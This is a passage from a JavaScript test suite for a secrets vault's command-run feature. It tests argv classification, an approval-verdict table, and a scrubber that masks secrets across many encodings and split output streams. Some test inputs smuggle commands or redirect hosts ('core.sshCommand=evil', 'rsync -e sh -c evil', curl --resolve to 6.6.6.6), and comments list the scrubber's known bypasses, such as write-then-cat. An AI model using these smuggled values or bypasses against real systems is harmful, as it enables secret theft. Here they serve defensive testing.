    [['curl', '--resolve', 'api.example.com:443:1.2.3.4', 'https://api.example.com'], [], ['curl', '--resolve=api.example.com:443:6.6.6.6', 'https://api.example.com'], [], 'curl --resolve (both spellings)'],
    [['git', '-c', 'http.proxy=', 'push'], [], ['git', '-c', 'core.sshCommand=evil', 'push'], [], 'git -c'],
    [['rsync', '-e', 'ssh', 'a', 'h:b'], [], ['rsync', '-e', 'sh -c evil', 'a', 'h:b'], [], 'rsync -e'],
  ];
  const same = DIFF.filter(([a, ae, b, be]) => K(a, ae) === K(b, be)).map((x) => x[4]);
  ok(!same.length && V.SHAPE_V === 'vr2', `a NEW shape (vr2): ${DIFF.map((x) => x[4]).join(' · ')}`, same);
  ok(S(['psql', '-c', 'x'], { env: [['T', M1], ['PGHOST', 'db.internal']] }).hosts.join() === 'db.internal' && S(['mysql'], { env: [['T', M1], ['MYSQL_HOST', 'my.db']] }).hosts.join() === 'my.db', 'PGHOST / MYSQL_HOST name the hosts (the card\'s Hosts line)');
  const NA = [[['npm', 'publish'], 'runs-project-code'], [['pip', 'install', '.'], 'runs-project-code'], [['docker', 'build', '.'], 'runs-project-code'], [['curl', '-K', 'c.cfg', 'https://a.example'], 'config-file'], [['ssh', '-F', 'cfg', 'h.example'], 'config-file'], [['kubectl', '--server', 'https://k8s.example', '--kubeconfig', 'k', 'get', 'pods'], 'config-file']];
  const naBad = NA.filter(([argv, why]) => S(argv).noAlways !== why || S(argv).always);
  ok(!naBad.length && S(['curl', 'https://a.example'], { programWritable: true }).noAlways === 'program-writable' && S(['curl', 'https://a.example']).always === true, 'no «always» for a tool that runs the project\'s code, reads a config file the card cannot show, or a program an agent could have written', naBad.map((x) => [x[0][0], S(x[0]).noAlways]));
  const SRC = fs.readFileSync(path.join(REPO, 'src/vault-run.js'), 'utf8');
  ok(/const URL_FIND_RE = \/\\b\(\[a-z\]\[a-z0-9\+\.-\]\{0,31\}\):\\\/\\\/\\S\+\/gi;/.test(SRC) && !/\[a-z0-9\+\.-\]\*:\\\/\\\//.test(SRC) && S(['curl', 'https://a.example'], { env: [['T', M1], ['P', 'a.'.repeat(32768)]] }).always, 'the URL LOCATOR\'s scheme is BOUNDED ({0,31}) and it runs to whitespace (the host is read by urlParse / new URL — round 3): an unbounded scheme walked a 64 KiB «a.a.a…» value quadratically (measured 335 ms at 32 KiB, minutes at a megabyte — the review)');
}

console.log('⑤ THE VERDICT — entry × conversation × shape × time');
{
  const sorted = (a) => [...a].sort().join();
  const doorStores = [...new Set(V.OWN_DOORS.map((d) => d.store))];
  ok(sorted([...doorStores, ...V.RUNNABLE_STORES]) === sorted(VI.GROUP_IDS) && !doorStores.some((s) => V.RUNNABLE_STORES.includes(s)), `every store of the vault (${VI.GROUP_IDS.length}) has its own door or is runnable by the owner\'s switch — exactly once`, { doorStores, runnable: V.RUNNABLE_STORES, groups: VI.GROUP_IDS });
  const D = (store, entry) => V.ownDoorOf({ store, entry, field: 'x' });
  ok(['accounts', 'integrations', 'channels', 'passkeys', 'automation'].every((s) => typeof D(s, 'a') === 'string') && /machine/.test(D('secrets', 'host:abc')) && /relay/.test(D('secrets', 'frp:token')) && typeof D('secrets', 'file:k') === 'string' && typeof D('secrets', 'anything-new') === 'string', 'login / channel / integration / passkey / automation entries and the hub\'s secrets (a machine link, the relay, a sealed file, anything new) are never referenced — each names its door');
  ok(D('mounts', 'm1') === null && D('app-secrets', 'app') === null && typeof D('a-new-store', 'x') === 'string' && typeof V.ownDoorOf(null) === 'string', 'mounts and app logins may be opened for runs; a store the table does not know fails closed');
  const plan = { always: V.planOf({ argv: ['curl', 'https://api.example.com'], env: [['T', M1]] }), noalways: V.planOf({ argv: ['bash', '-c', 'curl https://api.example.com'], env: [['T', M1]] }), door: V.planOf({ argv: ['curl', 'https://api.example.com'], env: [['T', ACCT]] }), refused: V.planOf({ argv: ['curl', `--x=${M1}`] }) };
  const NOW = 1_800_000_000_000;
  const REM = { none: null, valid: { until: NOW + 1 }, expired: { until: NOW }, forever: { until: null } };
  const ref = (c) => {   // lane vault-run-door: + `seen` (the owner allowed this shape once already, this unlock)
    if (c.state === 'not_set_up') return 'vault_not_set_up';
    if (c.state !== 'unlocked') return 'vault_locked';
    if (c.plan === 'refused') return 'argv_refused';
    if (c.plan === 'door') return 'entry_has_its_own_door';
    if (!c.exists) return 'entry_unknown';
    if (!c.open) return 'entry_not_runnable';
    if (!c.long) return 'entry_too_short_to_mask';
    if (!c.granted) return 'use_not_granted';
    const always = c.plan === 'always';
    if (always && (c.rem === 'valid' || c.rem === 'forever')) return 'ok:always';
    const mode = c.policy || (c.instance === 'cluster' ? 'ask' : 'allow');
    if (mode === 'allow' && c.seen) return 'ok:seen';
    return always ? 'ask:once,always,deny' : 'ask:once,deny';
  };
  const bad = []; let n = 0;
  for (const state of ['not_set_up', 'locked', 'unlocked']) for (const pk of Object.keys(plan)) for (const exists of [false, true]) for (const open of [false, true]) for (const long of [false, true])
    for (const granted of [false, true]) for (const rem of Object.keys(REM)) for (const instance of ['cluster', 'local']) for (const policy of [null, 'ask', 'allow']) for (const seen of [false, true]) {
      const p = plan[pk], id = p.ok ? p.refs[0].id : 'mounts:m1#secretKey';
      const v = V.runVerdict({ state, plan: p, entries: [{ id, exists, open, bytes: long ? 32 : 7 }], granted, remembered: REM[rem], seen, instance, policy, now: NOW });
      const got = v.ok ? `ok:${v.by}` : v.ask ? `ask:${v.offers.join()}` : v.code;
      const want = ref({ state, plan: pk, exists, open, long, granted, rem, instance, policy, seen });
      n++; if (got !== want) bad.push({ state, pk, exists, open, long, granted, rem, instance, policy, seen, got, want });
    }
  ok(n === 9216 && !bad.length, `runVerdict: ${n} cells vs the reference — not set up / locked FIRST, the plan's refusal, an entry with its own door / unknown / not opened / under 8 bytes, the grant, a live «always» (an expired one asks again; never for a shape without «always»), else a cluster ASKS every time and a local instance asks a NEW shape and allows a SEEN one (policy overrides)`, bad.slice(0, 5));
  const fresh = ['cluster', 'local'].map((instance) => V.runVerdict({ state: 'unlocked', plan: plan.always, entries: [{ id: 'mounts:m1#secretKey', exists: true, open: true, bytes: 32 }], granted: true, instance }));
  ok(fresh.every((v) => v.ask === true), 'decision ②: a NEW shape draws the card on a cluster AND on a local instance (a local one allows it after one 允许)', fresh);
  const ask = V.runVerdict({ state: 'unlocked', plan: plan.always, entries: [{ id: 'mounts:m1#secretKey', exists: true, open: true, bytes: 32 }], granted: true, instance: 'cluster' });
  ok(ask.ask && ask.ttlMs === 60000 && eq(ask.alwaysTtls, ['8h', '30d', 'forever']) && ask.alwaysDefault === '30d' && ask.reauth === true, 'the card: 60 s, «always» for 8 h / 30 days (the default) / for ever, and «always» needs «verify it is you»', ask);
  const ask2 = V.runVerdict({ state: 'unlocked', plan: plan.noalways, entries: [{ id: 'mounts:m1#secretKey', exists: true, open: true, bytes: 32 }], granted: true, instance: 'cluster' });
  ok(ask2.ask && ask2.noAlways === 'shell' && !ask2.alwaysTtls.length && ask2.reauth === false, 'a shell\'s card offers once / deny only and says why', ask2);
  const lk = V.runVerdict({ state: 'locked', plan: plan.refused });
  ok(lk.code === 'vault_locked' && lk.words.includes(VB.TOLD), 'locked ⇒ vault_locked BEFORE anything else (even a refused plan), in THE words (src/vault-blocked.js: the user was already told)', lk);
  const dr = V.runVerdict({ state: 'unlocked', plan: plan.door, entries: [], granted: true });
  ok(dr.code === 'entry_has_its_own_door' && dr.ref === ACCT && /account pool/.test(dr.words), 'an own-door refusal names the reference and its door', dr);
}

console.log('⑥ THE SCRUBBER — a value and its forms (FORMS: spelled and read), over ONE window per run');
const LABEL = 'mounts/m1/secretKey', PH = `[vault:${LABEL}]`;
const VALUES = [
  'planted-VALUE-0001',
  'p/l+a=n t?e&d#9%~*',
  'quote"back\\slash<tag>&amp\u007f',
  'pässwörd-日本-🔑-x',
  '-----BEGIN KEY-----\nMIIBplanted\nline2==\n-----END KEY-----\n',
  'abcdefgh',
  crypto.createHash('sha512').update('vault-run-model').digest('base64').repeat(40),
];
const b64 = (s) => Buffer.from(s).toString('base64');
const enc = (v, keep, up = true) => [...Buffer.from(v)].map((b) => (b < 128 && keep.test(String.fromCharCode(b)) ? String.fromCharCode(b) : '%' + b.toString(16).padStart(2, '0')[up ? 'toUpperCase' : 'toLowerCase']())).join('');
const pyAscii = (v) => JSON.stringify(v).replace(/[\u007f-\uffff]/g, (c) => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0'));
// lane vault-scrub-forms — how a REAL producer spells a value, built with Node's own codecs or written out from the spec (never
// the module's code): the oracle the new forms are judged by
const streamText = (buf) => { const d = new StringDecoder('utf8'); return d.write(buf) + d.end(); };   // what the door's decoder hands on
const cps = (v) => [...v];
const B32A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
const b32 = (v) => { const bits = [...Buffer.from(v)].map((b) => b.toString(2).padStart(8, '0')).join(''); let s = ''; for (let i = 0; i < bits.length; i += 5) s += B32A[parseInt(bits.slice(i, i + 5).padEnd(5, '0'), 2)]; return s + '='.repeat((8 - (s.length % 8)) % 8); };
// RFC 2045 §6.7: a printable byte as is (not '='), any other =XX; a soft line break lands wherever the 76th column falls — here INSIDE the value
const qpOf = (v, { every = false, lower = false, soft = '=\r\n' } = {}) => { const p = [...Buffer.from(v)].map((b) => (!every && b >= 33 && b <= 126 && b !== 61 ? String.fromCharCode(b) : '=' + b.toString(16).padStart(2, '0')[lower ? 'toLowerCase' : 'toUpperCase']())), h = p.length >> 1; return p.slice(0, h).join('') + soft + p.slice(h).join(''); };
// Python repr(bytes): printable ASCII as is (\\ and the quote escaped), \t \n \r, every other byte \xNN
const pyBytes = (v) => "b'" + [...Buffer.from(v)].map((b) => (b === 92 ? '\\\\' : b === 39 ? "\\'" : b === 9 ? '\\t' : b === 10 ? '\\n' : b === 13 ? '\\r' : b >= 32 && b < 127 ? String.fromCharCode(b) : '\\x' + b.toString(16).padStart(2, '0'))).join('') + "'";
// Python ascii(str): \xNN / \uXXXX / \UXXXXXXXX by CODE POINT
const pyStr = (v) => "'" + cps(v).map((c) => { const p = c.codePointAt(0); return c === '\\' ? '\\\\' : c === "'" ? "\\'" : c === '\n' ? '\\n' : c === '\t' ? '\\t' : c === '\r' ? '\\r' : p >= 32 && p < 127 ? c : p < 0x100 ? '\\x' + p.toString(16).padStart(2, '0') : p < 0x10000 ? '\\u' + p.toString(16).padStart(4, '0') : '\\U' + p.toString(16).padStart(8, '0'); }).join('') + "'";
const everyX = (v) => [...Buffer.from(v)].map((b) => '\\x' + b.toString(16).padStart(2, '0').toUpperCase()).join('');   // strace -xx, a C literal
const rustU = (v) => cps(v).map((c) => '\\u{' + c.codePointAt(0).toString(16) + '}').join('');                      // Rust escape_unicode
const octal = (v) => [...Buffer.from(v)].map((b) => (b >= 127 || b < 32 ? '\\' + b.toString(8).padStart(3, '0') : b === 92 ? '\\\\' : String.fromCharCode(b))).join('');   // git core.quotePath, bash $'…'
const htmlEscape = (v) => v.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;');   // Python html.escape, Jinja
const htmlEvery = (v) => cps(v).map((c) => `&#${c.codePointAt(0)};`).join('');
const owasp = (v) => cps(v).map((c) => (/[A-Za-z0-9]/.test(c) ? c : `&#x${c.codePointAt(0).toString(16).toUpperCase()};`)).join('');
const sgrEvery4 = (v) => cps(v).map((c, i) => (i && i % 4 === 0 ? '\x1b[0m' : '') + c).join('');   // escapes BETWEEN the characters
const grepColor = (v) => { const a = cps(v), h = a.length >> 1; return a.slice(0, 3).join('') + '\x1b[01;31m\x1b[K' + a.slice(3, h).join('') + '\x1b[m\x1b[K' + a.slice(h).join(''); };
const tputBold = (v) => { const a = cps(v), h = a.length >> 1; return a.slice(0, h).join('') + '\x1b[1m' + a.slice(h, h + 2).join('') + '\x1b(B\x1b[m' + a.slice(h + 2).join(''); };
const wrapAt = (s, n) => s.match(new RegExp(`[\\s\\S]{1,${n}}`, 'g')).join('\n');
// [name, value → { text, L, R }]: L / R = how many characters of the printing may stay beside the placeholder (the bytes
// around the value + the ONE character that mixes a neighbour's bits with the value's + the padding)
const around = (pre, post) => ({ L: Math.ceil((8 * pre) / 6), R: Math.ceil((8 * post) / 6) + 3 });
const PRINTS = [
  ['raw', (v) => ({ text: v, L: 0, R: 0 })],
  ['base64', (v) => ({ text: b64(v), L: 0, R: 0 })],
  ['base64, no padding', (v) => ({ text: b64(v).replace(/=+$/, ''), L: 0, R: 0 })],
  ['base64url', (v) => ({ text: Buffer.from(v).toString('base64url'), L: 0, R: 0 })],
  ['base64url, padded', (v) => ({ text: b64(v).replace(/\+/g, '-').replace(/\//g, '_'), L: 0, R: 0 })],
  ['base64 of x + value + yz (byte 1)', (v) => ({ text: b64('x' + v + 'yz'), ...around(1, 2) })],
  ['Basic base64(user:value) (byte 2)', (v) => ({ text: b64('user:' + v), ...around(5, 0) })],
  ['base64 of abc + value (byte 0)', (v) => ({ text: b64('abc' + v), ...around(3, 0) })],
  ['base64url of ab + value + c (byte 2)', (v) => ({ text: Buffer.from('ab' + v + 'c').toString('base64url'), ...around(2, 1) })],
  ['encodeURIComponent', (v) => ({ text: encodeURIComponent(v), L: 0, R: 0 })],
  ['percent, lower-case hex', (v) => ({ text: encodeURIComponent(v).replace(/%[0-9A-F]{2}/g, (m) => m.toLowerCase()), L: 0, R: 0 })],
  ['a WHATWG form (URLSearchParams)', (v) => ({ text: new URLSearchParams({ k: v }).toString().slice(2), L: 0, R: 0 })],
  ['RFC 3986 (!\'()* too)', (v) => ({ text: enc(v, /[A-Za-z0-9\-_.~]/), L: 0, R: 0 })],
  ['Python quote (keeps /)', (v) => ({ text: enc(v, /[A-Za-z0-9\-_.~/]/), L: 0, R: 0 })],
  ['every byte %XX', (v) => ({ text: enc(v, /(?!)/), L: 0, R: 0 })],
  ['every byte %xx', (v) => ({ text: enc(v, /(?!)/, false), L: 0, R: 0 })],
  ['JSON.stringify', (v) => ({ text: JSON.stringify(v), L: 1, R: 1 })],
  ['JSON with \\/', (v) => ({ text: JSON.stringify(v).replace(/\//g, '\\/'), L: 1, R: 1 })],
  ['Python json.dumps (ensure_ascii)', (v) => ({ text: pyAscii(v), L: 1, R: 1 })],
  ['Python ensure_ascii, upper-case hex', (v) => ({ text: pyAscii(v).replace(/\\u([0-9a-f]{4})/g, (m, h) => '\\u' + h.toUpperCase()), L: 1, R: 1 })],
  ['Go json (HTML-safe)', (v) => ({ text: JSON.stringify(v).replace(/[<>&]/g, (c) => '\\u00' + c.charCodeAt(0).toString(16)), L: 1, R: 1 })],
  ['JSON inside a JSON log line', (v) => ({ text: JSON.stringify({ msg: 'auth', token: v }), L: '{"msg":"auth","token":"'.length, R: 2 })],
  ['hex', (v) => ({ text: Buffer.from(v).toString('hex'), L: 0, R: 0 })],
  ['HEX', (v) => ({ text: Buffer.from(v).toString('hex').toUpperCase(), L: 0, R: 0 })],
  ['an Authorization header (curl -v)', (v) => ({ text: `> Authorization: Bearer ${v}\r\n`, L: 24, R: 2 })],
  ['twice on one line', (v) => ({ text: `${v} and ${v}`, L: 0, R: 5 + PH.length })],
  // lane vault-scrub-forms (q-043 verify M1): what a REAL producer prints by itself — the label's head is the form
  ['utf16: UTF-16LE (PowerShell 5 > / Out-File, reg export)', (v) => ({ text: streamText(Buffer.from(v, 'utf16le')), L: 0, R: 0 })],
  ['utf16: UTF-16BE (Java writeChars)', (v) => ({ text: streamText(Buffer.from(v, 'utf16le').swap16()), L: 0, R: 0 })],
  ['base32: RFC 4648 (oathtool -v)', (v) => ({ text: b32(v), L: 0, R: 0 })],
  ['base32: no padding, lower-case (an otpauth secret)', (v) => ({ text: b32(v).replace(/=+$/, '').toLowerCase(), L: 0, R: 0 })],
  ['qp: a quoted-printable mail body (=XX, a soft break inside)', (v) => ({ text: qpOf(v), L: 0, R: 0 })],
  ['qp: every byte =xx, =\\n soft break', (v) => ({ text: qpOf(v, { every: true, lower: true, soft: '=\n' }), L: 0, R: 0 })],
  ['escape: Python repr(bytes) b\'…\\xNN…\'', (v) => ({ text: pyBytes(v), L: 2, R: 1 })],
  ['escape: Python ascii(str) \\xNN \\uXXXX \\U…', (v) => ({ text: pyStr(v), L: 1, R: 1 })],
  ['escape: every byte \\xNN (strace -xx)', (v) => ({ text: everyX(v), L: 0, R: 0 })],
  ['escape: a run of escaped backslashes, then every byte \\xNN (pairs read from the run\'s start)', (v) => ({ text: '\\\\'.repeat(5) + everyX(v), L: 10, R: 0 })],
  ['escape: Rust escape_unicode \\u{…}', (v) => ({ text: rustU(v), L: 0, R: 0 })],
  ['escape: git / bash octal \\NNN', (v) => ({ text: octal(v), L: 0, R: 0 })],
  ['entity: html.escape (& < > " \' as entities)', (v) => ({ text: htmlEscape(v), L: 0, R: 0 })],
  ['entity: every character &#NN;', (v) => ({ text: htmlEvery(v), L: 0, R: 0 })],
  ['entity: non-alphanumerics &#xHH; (OWASP encoder)', (v) => ({ text: owasp(v), L: 0, R: 0 })],
  ['ansi: an SGR escape every 4 characters', (v) => ({ text: sgrEvery4(v), L: 0, R: 0 })],
  ['ansi: grep --color highlighting a part', (v) => ({ text: grepColor(v), L: 0, R: 0 })],
  ['ansi: bold, then tput sgr0 (\\x1b(B\\x1b[m)', (v) => ({ text: tputBold(v), L: 0, R: 0 })],
  ['wrap: base64 at 76 columns (a MIME body) — the value across a line break', (v) => ({ text: wrapAt(b64('x'.repeat(48) + v), 76), L: 64, R: 4 })],
  ['wrap: openssl base64 (64 columns)', (v) => ({ text: wrapAt(b64(v), 64), L: 0, R: 0 })],
];
const secretsOf = (v) => [{ label: LABEL, value: v }];
/** null when the printing is scrubbed: before + (≤ L chars) + THE PLACEHOLDER + (≤ R chars) + after, and the raw value gone. */
function leakOf(Vm, v, p) {
  const { text, L, R } = p(v);
  const out = Vm.maskText(`before ${text} after`, secretsOf(v));
  const m = new RegExp(`^before ([\\s\\S]*?)${PH.replace(/[[\]]/g, '\\$&')}([\\s\\S]*) after$`).exec(out);
  return !m || m[1].length > L || m[2].length > R || out.includes(v) ? out.slice(0, 300) : null;
}
function scrubLeaks(Vm) { const out = []; for (const v of VALUES) for (const [name, p] of PRINTS) { const l = leakOf(Vm, v, p); if (l !== null) out.push([v.slice(0, 24), name, l]); } return out; }
// the shipped module's legs are run ONCE (the mutants below each compare against them — the suite's time budget)
const SHIPPED = new Map(); const once = (key, f) => { if (!SHIPPED.has(key)) SHIPPED.set(key, f()); return SHIPPED.get(key); };
const READ_ROWS = PRINTS.filter(([n]) => /^(qp|escape|entity|ansi|wrap): /.test(n));
function chunked(Vm, text, v, sizes) { const m = Vm.createMasker(secretsOf(v)); let out = '', i = 0, k = 0; while (i < text.length) { const n = sizes[k++ % sizes.length]; out += m.push(text.slice(i, i + n)); i += n; } return out + m.end(); }
/** every split point (values ≤ 64 bytes) and 1 / 3 / 7-character chunks; the long value at 211 and 4096 */
function chunkEscapes(Vm, rows = PRINTS) {
  const out = [];
  for (const v of VALUES) for (const [name, p] of rows) {
    const text = `before ${p(v).text} after`, whole = Vm.maskText(text, secretsOf(v));
    const short = Buffer.byteLength(v) <= 64;
    if (short) for (let i = 0; i <= text.length; i++) { const got = chunked(Vm, text, v, [i, text.length]); if (got !== whole) { out.push([v.slice(0, 24), name, `split at ${i}`]); break; } }
    for (const sizes of short ? [[1], [3], [7, 2]] : [[211], [4096, 13]]) { const got = chunked(Vm, text, v, sizes); if (got !== whole) out.push([v.slice(0, 24), name, `chunks ${sizes}`]); }
  }
  return out;
}
{
  const t0 = Date.now();
  const leaks = once('scrub', () => scrubLeaks(V));
  ok(!leaks.length, `${VALUES.length} values × ${PRINTS.length} printings (Node's own encoders): each becomes ${PH} with at most the neighbours' characters beside it — raw, base64 (± padding, URL-safe, inside a longer run at all three byte alignments: Basic user:pass), percent (upper / lower, encodeURIComponent / RFC 3986 / Python / WHATWG form / every byte), JSON (\\/, ensure_ascii, HTML-safe, nested in a log line), hex`, leaks.slice(0, 4));
  const forms = new Set(V.formsOf('p/l+a=n t?e&d#9%~*"é').map((f) => f.form));
  const spelled = V.FORM_ROWS.filter((r) => r.how === 'spelled').map((r) => r.form), read = V.FORM_ROWS.filter((r) => r.how === 'read').map((r) => r.form);
  ok(eq([...forms].sort(), [...spelled].sort()) && eq(V.VIEWS.map((x) => x.form), read) && eq(V.FORMS, V.FORM_ROWS.map((r) => r.form)) && V.FORMS.length === 12
    && V.FORM_ROWS.every((r) => typeof r.producer === 'string' && r.producer.length > 20) && new Set(PRINTS.map(([n]) => (/^(\w+): /.exec(n) || [])[1]).filter(Boolean)).size === 7,
    `FORMS is THE ONE LIST (${V.FORMS.join(', ')}): the spelled ones are exactly what formsOf builds, the read ones exactly the VIEWS, each row names its real producer — and every NEW form has printings here`);
  const esc = once('chunk', () => chunkEscapes(V));
  ok(!esc.length, `THE CHUNK WINDOW: the same ${VALUES.length * PRINTS.length} texts cut at EVERY split point (values ≤ 64 bytes) and fed 1 / 3 / 7+2 characters at a time (the 2 560-byte value at 211 and 4096+13) scrub exactly as the whole text does`, esc.slice(0, 4));
  const m = V.createMasker(secretsOf(VALUES[0])), W = m.window;
  const first = m.push('x'.repeat(100) + VALUES[0].slice(0, 5)), second = m.push(VALUES[0].slice(5) + ' ok'), last = m.end();
  ok(W === Math.max(...V.formsOf(VALUES[0]).map((f) => f.text.length)) - 1 && first === 'x'.repeat(105 - W) && second === 'x'.repeat(105 + 13 + 3 - W - first.length) && last === 'x'.repeat(100 - first.length - second.length) + PH + ' ok' && m.hits === 1 && m.byForm.raw === 1 && m.bytes === Buffer.byteLength(VALUES[0]), 'the window: push hands on all but the last (longest form − 1) characters — a value that STARTS inside them waits for the next chunk or the end; end flushes; hits / bytes (UTF-8, the audit\'s count) / byForm count', { W, first: first.length, second, last, bytes: m.bytes });
  const PLAIN = ['plain text, no value here: ünïcödé 🔑 vault://mounts/m1/secretKey [vault:x] %41 \\u0041', 'x'.repeat(5000)];
  ok(PLAIN.every((t) => chunked(V, t, VALUES[1], [1]) === t && chunked(V, t, VALUES[1], [17, 3]) === t && V.maskText(t, secretsOf(VALUES[1])) === t), 'text without a value passes byte for byte, chunked or whole (references and placeholders included)');
  let threw = null; try { V.createMasker([{ label: LABEL, value: 'abcdefg' }]); } catch (e) { threw = e.code; }
  ok(threw === 'entry_too_short_to_mask' && !!V.createMasker([{ label: LABEL, value: 'éééé' }]) && !!V.createMasker([{ label: LABEL, value: 'abcdefgh' }]), 'a value under 8 bytes cannot be scrubbed: createMasker refuses it by name (8 bytes — four é — is enough)');
  const two = [{ label: 'mounts/a/k', value: 'planted-VALUE-0001' }, { label: 'mounts/b/k', value: 'planted-VALUE-0001-and-more' }];
  ok(V.maskText('1 planted-VALUE-0001-and-more 2 planted-VALUE-0001 3', two) === '1 [vault:mounts/b/k] 2 [vault:mounts/a/k] 3', 'two values, one inside the other: the longest form wins where both match');
  ok(V.maskText('k=planted-VALUE-0001', [{ ref: V.parseRef(M2), value: 'planted-VALUE-0001' }]) === 'k=[vault:mounts/m2/secretKey]' && V.maskText('k=planted-VALUE-0001', [{ ref: M2, value: 'planted-VALUE-0001' }]) === 'k=[vault:mounts/m2/secretKey]', 'a secret named by its parsed reference or its vault:// string wears that placeholder');
  // THE SIEVE (§8.6 ③) — the named holes pass on purpose; these are controls, not wishes
  const v = VALUES[0], rev = [...v].reverse().join(''), sha = crypto.createHash('sha256').update(v).digest('hex');
  const so = V.createMasker(secretsOf(v)), se = V.createMasker(secretsOf(v));
  const split = so.push(v.slice(0, 9)) + so.end() + '|' + se.push(v.slice(9)) + se.end();
  // ONE window per run (the desk's M1): the run's ONE masker is fed by both pipes in arrival order — the same split is masked,
  // each character handed back to the stream it came on, the placeholder on the stream the value began on
  const both = (feed) => { const m = V.createRunMasker(secretsOf(v)), acc = { out: '', err: '' }; const add = (o) => { acc.out += o.out; acc.err += o.err; }; for (const [k, c] of feed) add(m.push(k, c)); add(m.end()); return acc; };
  const one = both([['out', 'a ' + v.slice(0, 9)], ['err', v.slice(9) + ' b'], ['out', ' c']]);
  ok(one.out === 'a ' + PH + ' c' && one.err === PH + ' b' && split === v.slice(0, 9) + '|' + v.slice(9), 'ONE WINDOW PER RUN: a value split between stdout and stderr is masked by the run\'s one masker (stdout «a [vault:…] c», stderr «[vault:…] b» — each pipe shows where its part was) — two maskers, one per stream, let the same split by (the control)', [one, split.slice(0, 40)]);
  // …and reading the pipes in arrival order never costs a value inside ONE pipe: the other pipe's chunk between its halves
  const h = v.length >> 1, inter = both([['out', '<' + v.slice(0, h)], ['err', '<' + v.slice(0, h)], ['out', v.slice(h) + '>'], ['err', v.slice(h) + '>']]);
  ok(inter.out === '<' + PH + '>' && inter.err === '<' + PH + '>', 'a value written to EACH pipe in two pieces, the other pipe\'s piece arriving between them, is masked on both (each pipe is read on its own too)', inter);
  // a seeded fuzz over the two pipes: values whole on one pipe or split between them, other output around, every chunking
  let seed = 7; const rnd = (n) => { seed = (seed * 1103515245 + 12345) % 2147483648; return seed % n; };
  const fuzzBad = [];
  for (let round = 0; round < 60; round++) {
    const val = VALUES[rnd(4)], prints = PRINTS.filter(([n]) => !/twice/.test(n)), [pn, p] = prints[rnd(prints.length)], txt = p(val).text;
    const feed = [];
    for (let j = 0; j < 3; j++) feed.push([rnd(2) ? 'out' : 'err', 'noise ' + j + ' ']);
    const k = rnd(2) ? 'out' : 'err', cutAt = rnd(txt.length - 1) + 1;
    if (rnd(2)) feed.push([k, txt.slice(0, cutAt)], [k === 'out' ? 'err' : 'out', 'between '], [k, txt.slice(cutAt)]);   // one pipe, the other's chunk inside
    else feed.push([k, txt.slice(0, cutAt)], [k === 'out' ? 'err' : 'out', txt.slice(cutAt)]);                       // split between the pipes
    feed.push([rnd(2) ? 'out' : 'err', ' tail']);
    for (const size of [1, 3, 1e9]) {
      const fine = feed.flatMap(([s, c]) => { const o = []; for (let i = 0; i < c.length; i += size) o.push([s, c.slice(i, i + size)]); return o; });
      const r = both(fine), joined = [r.out + r.err, r.err + r.out];
      if (!r.out.includes(PH) && !r.err.includes(PH) || joined.some((j) => j.includes(val) || (Buffer.byteLength(val) <= 64 && j.includes(val.slice(0, 12))))) fuzzBad.push([pn, size, JSON.stringify(r).slice(0, 160)]);
    }
  }
  ok(!fuzzBad.length, 'A SEEDED FUZZ over the two pipes (60 rounds × 3 chunkings — a value whole on one pipe with the other\'s chunk inside it, or split between the pipes; noise around): every round masked, no 12 characters of a value on either pipe or both joined', fuzzBad.slice(0, 3));
  const bs = V.createMasker(secretsOf(v)), bsOut = bs.push('\\'.repeat(65536)).length;
  ok(bsOut >= 65536 - 2 * bs.window - 12, `a 64 KiB run of backslashes is handed on as it comes (${bsOut} characters before the end — the escape view keeps back its window of pairs (2 × window) and one unfinished token from the run's last pair boundary, never the whole run)`, bsOut);
  const swap = (s) => s[0] === s[0].toUpperCase() ? s[0].toLowerCase() + s.slice(1) : s[0].toUpperCase() + s.slice(1);
  const gz = zlib.gzipSync(Buffer.from(v)).toString('base64'), spaced = cps(v).join(' '), apart = both([['out', v.slice(0, 9)], ['out', ' other output '], ['err', v.slice(9)]]);
  ok(V.maskText(rev, secretsOf(v)) === rev && V.maskText(sha, secretsOf(v)) === sha && V.maskText(v.slice(-4), secretsOf(v)) === v.slice(-4) && V.maskText(gz, secretsOf(v)) === gz && V.maskText(spaced, secretsOf(v)) === spaced && V.maskText(swap(v), secretsOf(v)) === swap(v) && apart.out + apart.err === v.slice(0, 9) + ' other output ' + v.slice(9),
    'THE SIEVE\'S NAMED HOLES pass (controls): a reversal, a hash, the last four characters, gzip + base64 (a compressed stream is not a spelling), the characters spaced, one case swapped, a value split between the pipes with other output between the halves — invented, never what a tool prints by itself');
  const head = fs.readFileSync(SRC, 'utf8').split('\nconst VI = ')[0];
  ok(/THE SCRUBBER IS A SIEVE/.test(head) && /WRITE-THEN-CAT DEFEATS IT/.test(head) && /NOT isolation/.test(head) && /a tool can SEND the value somewhere/.test(head) && /refusal table is a belt, not a proof/.test(head) && /THE FLOOR/.test(head) && /ONE window per run/.test(head), 'the module\'s header says so: the scrubber is a sieve, write-then-cat defeats it, same-uid is not isolation, a tool can send the value out, the refusal table is a belt — and it states THE FLOOR and the one window per run');
  console.log(`  (the scrubber legs ran in ${Date.now() - t0} ms)`);
}

console.log('⑥b THE REAL PRODUCERS\' TABLE — every printing × a 21-character value × start / middle / end of a chunk × a cut inside it');
{
  const t0 = Date.now();
  const V21 = 'sk-Live_9f=Q/2u+Zt7wX';
  const POS = { start: (x) => [x + ' ' + 'y'.repeat(200), 0], middle: (x) => ['x'.repeat(100) + ' ' + x + ' ' + 'y'.repeat(100), 101], end: (x) => ['x'.repeat(200) + ' ' + x, 201] };
  const bad = [];
  let legs = 0;
  for (const [name, p] of PRINTS) {
    const { text, L, R } = p(V21);
    for (const [pos, place] of Object.entries(POS)) {
      const [chunk, at] = place(text);
      const whole = V.maskText(chunk, secretsOf(V21));
      const head = chunk.slice(0, at), tail = chunk.slice(at + text.length);
      const i = whole.indexOf(PH);
      const okWhole = whole.startsWith(head) && whole.endsWith(tail) && i >= head.length && i - head.length <= L && whole.length - tail.length - (i + PH.length) <= R && !whole.includes(V21) && !whole.includes(V21.slice(0, 10)) && !whole.includes(V21.slice(-10));
      if (!okWhole) { bad.push([name, pos, 'whole', JSON.stringify(whole).slice(0, 160)]); continue; }
      for (let c = at + 1; c < at + text.length; c++) {   // the stream cut at EVERY point inside the printed value
        legs++;
        const m = V.createMasker(secretsOf(V21)), got = m.push(chunk.slice(0, c)) + m.push(chunk.slice(c)) + m.end();
